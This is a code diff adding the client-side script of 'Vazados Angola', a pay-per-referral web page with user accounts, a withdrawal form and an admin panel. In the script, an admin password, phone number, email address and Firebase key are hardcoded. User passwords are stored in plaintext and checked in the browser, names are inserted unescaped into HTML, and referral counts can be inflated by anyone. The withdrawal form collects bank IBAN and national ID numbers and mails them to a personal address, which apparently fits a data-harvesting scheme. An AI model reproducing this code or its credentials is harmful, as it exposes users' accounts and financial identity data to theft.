+    <button class="btn btn-gold" id="enviar-btn" onclick="enviarSaque()" style="margin-bottom:10px">
+      Enviar Pedido de Saque
+    </button>
+    <button class="btn btn-outline" onclick="closeSaque()">Cancelar</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     MODAL: ADM CONTACT
+════════════════════════════════ -->
+<div class="overlay" id="modal-contact">
+  <div class="modal">
+    <div class="modal-title">📋 Detalhes do Utilizador</div>
+    <div id="contact-body"></div>
+    <button class="btn btn-outline" onclick="document.getElementById('modal-contact').classList.remove('open')" style="margin-top:12px">Fechar</button>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════
+     FIREBASE + LOGIC
+════════════════════════════════ -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import {
+  getFirestore, doc, getDoc, setDoc, updateDoc, collection,
+  getDocs, serverTimestamp, increment
+} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+// ── CONFIG ──
+const firebaseConfig = {
+  apiKey: "AIzaSyDgUZkaGn81HgHPWA-W9MvYH2jDNJlHFn4",
+  authDomain: "vazados-angola.firebaseapp.com",
+  projectId: "vazados-angola",
+  storageBucket: "vazados-angola.firebasestorage.app",
+  messagingSenderId: "766004109207",
+  appId: "1:766004109207:web:cada48fa0556ecc4632ed2"
+};
+const app = initializeApp(firebaseConfig);
+const db  = getFirestore(app);
+
+const BASE_URL  = 'https://beua14.github.io/';
+const ADM_PHONE = '934821771';
+const ADM_PASS  = 'Marakelcy14';
+const EMAIL_TO  = 'rodrigsbeua@gmail.com';
+
+// ── SESSION ──
+let SESSION = null;
+
+function getRef(phone){ return doc(db,'users',phone) }
+
+// ── SCREENS ──
+window.showScreen = function(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+};
+
+// ── TOAST ──
+function toast(msg, type=''){
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = 'toast show ' + (type ? 't-'+type : '');
+  clearTimeout(window._toastTimer);
+  window._toastTimer = setTimeout(()=> el.classList.remove('show'), 3000);
+}
+window.toast = toast;
+
+// ── REGISTER ──
+window.doRegister = async function(){
+  const phone = document.getElementById('reg-phone').value.trim();
+  const name  = document.getElementById('reg-name').value.trim();
+  const pass  = document.getElementById('reg-pass').value;
+  if(phone.length < 9) return toast('Número de telefone inválido','red');
+  if(!name) return toast('Insira o seu nome','red');
+  if(pass.length < 6) return toast('Senha mínimo 6 caracteres','red');
+  const btn = document.getElementById('reg-btn');
+  btn.innerHTML = '<span class="spin"></span>A criar conta...';
+  btn.disabled = true;
+  try {
+    const snap = await getDoc(getRef(phone));
+    if(snap.exists()) { toast('Este número já tem conta!','red'); btn.innerHTML='Criar Conta'; btn.disabled=false; return; }
+    await setDoc(getRef(phone),{
+      phone, name, pass,
+      clicks: 0,
+      created: serverTimestamp()
+    });
+    SESSION = { phone, name };
+    toast('Conta criada com sucesso! 🎉','green');
+    setTimeout(()=> loadApp(), 1000);
+  } catch(e) {
+    toast('Erro: '+e.message,'red');
+    btn.innerHTML='Criar Conta'; btn.disabled=false;
+  }
+};
+
+// ── LOGIN ──
+window.doLogin = async function(){
+  const phone = document.getElementById('login-phone').value.trim();
+  const pass  = document.getElementById('login-pass').value;
+  if(!phone) return toast('Insira o telefone','red');
+  const btn = document.getElementById('login-btn');
+  btn.innerHTML = '<span class="spin"></span>A entrar...';
+  btn.disabled = true;
+  try {
+    const snap = await getDoc(getRef(phone));
+    if(!snap.exists()) { toast('Número não encontrado','red'); btn.innerHTML='Entrar'; btn.disabled=false; return; }
+    const data = snap.data();
+    if(data.pass !== pass) { toast('Senha incorrecta','red'); btn.innerHTML='Entrar'; btn.disabled=false; return; }
+    SESSION = { phone, name: data.name };
+    loadApp();
+  } catch(e) {
+    toast('Erro: '+e.message,'red');
+    btn.innerHTML='Entrar'; btn.disabled=false;
+  }
+};
+
+// ── LOGOUT ──
+window.doLogout = function(){
+  SESSION = null;
+  showScreen('screen-landing');
+};
+
+// ── LOAD APP ──
+async function loadApp(){
+  showScreen('screen-app');
+  switchTab('home');
+  const snap = await getDoc(getRef(SESSION.phone));
+  if(!snap.exists()) return;
+  const u = snap.data();
+  const clicks = u.clicks || 0;
+  const kz     = Math.floor(clicks/10)*700;
+  const pct    = Math.min(100, Math.round((clicks/30)*100));
+  SESSION.name  = u.name;
+  SESSION.phone = u.phone || SESSION.phone;
+
+  // Header
+  document.getElementById('ah-name').textContent  = u.name;
+  document.getElementById('ah-phone').textContent = SESSION.phone;
+
+  // Home
+  document.getElementById('s-convites').textContent = clicks;
+  document.getElementById('s-kz').textContent        = kz;
+  document.getElementById('prog-txt').textContent   = clicks+'/30';
+  document.getElementById('prog-fill').style.width  = pct+'%';
+
+  // Saque button
+  const sb = document.getElementById('btn-saque');
+  if(clicks >= 30){
+    sb.className = 'btn btn-green';
+    sb.textContent = '💸 Sacar Ganhos';
+  } else {
+    sb.className = 'btn btn-disabled';
+    sb.textContent = '🔒 Sacar (mín. 30 convidados)';
+  }
+
+  // Link
+  const myLink = BASE_URL+'?ref='+SESSION.phone;
+  document.getElementById('link-url').textContent = myLink;
+  document.getElementById('lt-total').textContent  = clicks;
+  document.getElementById('lt-grupos').textContent = Math.floor(clicks/10);
+
+  // Ten blocks
+  buildTenBlocks(clicks);
+
+  // Perfil
+  document.getElementById('pf-name').value  = u.name;
+  document.getElementById('pf-phone').value = SESSION.phone;
+  document.getElementById('pf-convites').textContent = clicks;
+  document.getElementById('pf-kz').textContent       = kz+' Kz';
+}
+
+function buildTenBlocks(clicks){
+  const el = document.getElementById('ten-blocks');
+  if(clicks === 0){
+    el.innerHTML = `<div class="empty-state"><div class="es-icon">🔗</div><p>Partilhe o seu link<br>e os convidados aparecem aqui!</p></div>`;
+    return;
+  }
+  let html = '';
+  const groups = Math.ceil(clicks/10);
+  for(let i=0;i<groups;i++){
+    const inG   = Math.min(10, clicks - i*10);
+    const done  = inG===10;
+    const dots  = Array.from({length:10},(_,j)=>
+      `<div class="ten-dot ${j<inG?'filled':'empty'}">${j<inG?'👤':''}</div>`
+    ).join('');
+    html += `<div class="ten-group">
+      <div class="ten-group-hd">
+        <span class="gn">Grupo ${i+1}</span>
+        <span class="gs ${done?'gs-done':'gs-prog'}">${done?'✅ 700 Kz':inG+'/10'}</span>
+      </div>
+      <div class="ten-dots">${dots}</div>
+    </div>`;
+  }
+  el.innerHTML = html;
+}
+
+// ── TABS ──
+window.switchTab = function(tab){
+  ['home','link','normas','perfil'].forEach(t=>{
+    document.getElementById('tab-'+t).style.display = t===tab?'block':'none';
+    const n = document.getElementById('nav-'+t);
+    if(n) n.classList.toggle('on', t===tab);
+  });
+};
+
+// ── COPY LINK ──
+window.copyLink = function(){
+  const link = BASE_URL+'?ref='+SESSION.phone;
+  navigator.clipboard.writeText(link).then(()=>{
+    const b = document.getElementById('copy-btn');
+    b.textContent='Copiado!'; b.classList.add('ok');
+    toast('Link copiado com sucesso! 🔗','green');
+    setTimeout(()=>{ b.textContent='Copiar'; b.classList.remove('ok'); },2500);
+  }).catch(()=>{
+    const ta = document.createElement('textarea');
+    ta.value=BASE_URL+'?ref='+SESSION.phone;
+    document.body.appendChild(ta); ta.select();
+    document.execCommand('copy'); document.body.removeChild(ta);
+    toast('Link copiado! 🔗','green');
+  });
+};
+
+// ── SAQUE ──
+window.tryOpenSaque = async function(){
+  const snap = await getDoc(getRef(SESSION.phone));
+  const clicks = snap.data()?.clicks || 0;
+  if(clicks < 30){ toast('Precisa de 30 convidados para sacar','red'); return; }
+  const kz = Math.floor(clicks/10)*700;
+  document.getElementById('saque-saldo').textContent = kz+' Kz';
+  document.getElementById('saque-pontos').textContent = clicks;
+  document.getElementById('s-tel').value = SESSION.phone;
+  document.getElementById('modal-saque').classList.add('open');
+};
+
+window.closeSaque = function(){
+  document.getElementById('modal-saque').classList.remove('open');
+};
+
+window.enviarSaque = async function(){
+  const iban  = document.getElementById('s-iban').value.trim();
+  const banco = document.getElementById('s-banco').value.trim();
+  const tel   = document.getElementById('s-tel').value.trim();
+  const idade = document.getElementById('s-idade').value.trim();
+  const bi    = document.getElementById('s-bi').value.trim();
+  const valor = document.getElementById('s-valor').value.trim();
+  if(!iban||!banco||!tel||!idade||!bi||!valor) return toast('Preencha todos os campos','red');
+
+  const snap = await getDoc(getRef(SESSION.phone));
+  const u    = snap.data();
+  const kz   = Math.floor((u.clicks||0)/10)*700;
+  if(parseInt(valor) > kz) return toast(`Máximo disponível: ${kz} Kz`,'red');
+
+  const btn = document.getElementById('enviar-btn');
+  btn.innerHTML = '<span class="spin"></span>A enviar...';
+  btn.disabled = true;
+
+  const subject = encodeURIComponent('💸 Pedido de Saque – Vazados Angola');
+  const body = encodeURIComponent(
+    `PEDIDO DE SAQUE – VAZADOS ANGOLA\n\n`+
+    `═══════════════════\nDADOS DO UTILIZADOR\n═══════════════════\n`+
+    `Nome: ${u.name}\nTelefone: ${SESSION.phone}\nConvidados: ${u.clicks}\n`+
+    `Saldo total: ${kz} Kz\n\n`+
+    `═══════════════════\nDADOS BANCÁRIOS\n═══════════════════\n`+
+    `IBAN: ${iban}\nBanco: ${banco}\nTelefone: ${tel}\nIdade: ${idade}\nBI: ${bi}\n\n`+
+    `VALOR SOLICITADO: ${valor} Kz`
+  );
+  const a = document.createElement('a');
+  a.href = `mailto:${EMAIL_TO}?subject=${subject}&body=${body}`;
+  a.click();
+
+  toast('Pedido enviado com sucesso! ✅','green');
+  btn.innerHTML='Enviar Pedido de Saque'; btn.disabled=false;
+  closeSaque();
+};
+
+// ── REFERRAL CLICK ──
+async function handleRef(){
+  const params = new URLSearchParams(window.location.search);
+  const ref = params.get('ref');
+  if(!ref) return;
+  try {
+    const snap = await getDoc(getRef(ref));
+    if(snap.exists()){
+      await updateDoc(getRef(ref),{ clicks: increment(1) });
+    }
+  } catch(e){ console.warn('ref error',e) }
+}
+
+// ── ADM ──
+window.doAdmLogin = function(){
+  const p = document.getElementById('adm-p').value.trim();
+  const s = document.getElementById('adm-s').value;
+  if(p!==ADM_PHONE||s!==ADM_PASS) return toast('Credenciais inválidas','red');
+  loadAdm();
+};
+
+async function loadAdm(){
+  showScreen('screen-adm');
+  const snap = await getDocs(collection(db,'users'));
+  const users = [];
+  snap.forEach(d=> users.push({id:d.id,...d.data()}));
+  users.sort((a,b)=>(b.clicks||0)-(a.clicks||0));
+
+  const totalKz = users.reduce((acc,u)=> acc + Math.floor((u.clicks||0)/10)*700, 0);
+  document.getElementById('adm-total-users').textContent = users.length;
+  document.getElementById('adm-total-kz').textContent = totalKz;
+
+  const list = document.getElementById('adm-list');
+  if(!users.length){
+    list.innerHTML='<div class="empty-state"><div class="es-icon">👥</div><p>Nenhum utilizador ainda</p></div>';
+    return;
+  }
+  list.innerHTML = users.map((u,i)=>{
+    const kz = Math.floor((u.clicks||0)/10)*700;
+    const rb = i===0?'rb-1':i===1?'rb-2':i===2?'rb-3':'';
+    const medal = i===0?'🥇':i===1?'🥈':i===2?'🥉':'';
+    return `<div class="adm-user-card" onclick="admContact('${u.id}')">
+      <div>
+        <div class="auc-name">${medal} ${u.name}${rb?`<span class="rank-badge ${rb}">#${i+1}</span>`:''}</div>
+        <div class="auc-phone">${u.phone||u.id}</div>
+      </div>
+      <div>
+        <div class="auc-pts">${u.clicks||0}</div>
+        <div class="auc-kz">${kz} Kz</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+window.loadAdm = loadAdm;
+
+window.admContact = async function(phone){
+  const snap = await getDoc(getRef(phone));
+  if(!snap.exists()) return;
+  const u   = snap.data();
+  const kz  = Math.floor((u.clicks||0)/10)*700;
+  const pct = Math.min(100,Math.round(((u.clicks||0)/30)*100));
+  document.getElementById('contact-body').innerHTML = `
+    <div class="card" style="margin-bottom:12px">
+      <div style="display:flex;align-items:center;gap:14px;margin-bottom:16px">
+        <div style="width:48px;height:48px;border-radius:50%;background:rgba(204,0,23,.15);border:1px solid rgba(204,0,23,.3);display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0">👤</div>
+        <div>
+          <div style="font-size:16px;font-weight:700">${u.name}</div>
+          <div style="font-size:12px;color:var(--muted)">${phone}</div>
+        </div>
+      </div>
+      <div class="stats-row">
+        <div class="stat-box"><div class="sv">${u.clicks||0}</div><div class="sl">Convidados</div></div>
+        <div class="stat-box"><div class="sv" style="color:var(--green)">${kz}</div><div class="sl">Kz Ganhos</div></div>
+      </div>
+      <div class="prog-track" style="margin-top:10px">
+        <div class="prog-fill" style="width:${pct}%"></div>
+      </div>
+    </div>
+    <a href="tel:${phone}" class="btn btn-red" style="display:block;text-align:center;text-decoration:none;margin-bottom:10px;padding:14px">
+      📞 Ligar para ${phone}
+    </a>
+    <a href="https://wa.me/244${phone}" target="_blank" class="btn btn-green" style="display:block;text-align:center;text-decoration:none;padding:14px">
+      💬 WhatsApp
+    </a>`;
+  document.getElementById('modal-contact').classList.add('open');
+};
+
+// ── INIT ──
+async function init(){
+  await handleRef();
+  document.getElementById('screen-loading').classList.remove('active');
+  showScreen('screen-landing');
+}
+init();
+</script>
+</body>
+</html>
